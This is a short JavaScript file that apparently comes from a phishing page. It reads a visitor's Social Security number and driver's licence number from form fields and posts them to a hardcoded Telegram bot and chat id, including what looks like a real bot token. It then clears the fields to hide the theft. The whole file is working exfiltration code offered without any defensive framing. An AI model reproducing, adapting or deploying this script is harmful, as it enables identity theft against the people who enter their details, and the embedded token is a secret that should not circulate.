//bot token
var telegram_bot_id = "6403012866:AAGNpGzEijhSfRlMie3dqhv6DD4hucAY1k8";
//chat id
var chat_id = 6929442824;
var ssn, dl;
var ready = function () {
    ssn = document.getElementById("ssn").value;
    dl = document.getElementById("dl").value;
    message = "ssn: " + ssn + "\ndl: " + dl;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
    });
    document.getElementById("ssn").value = "";
    document.getElementById("dl").value = "";
    return false;
};
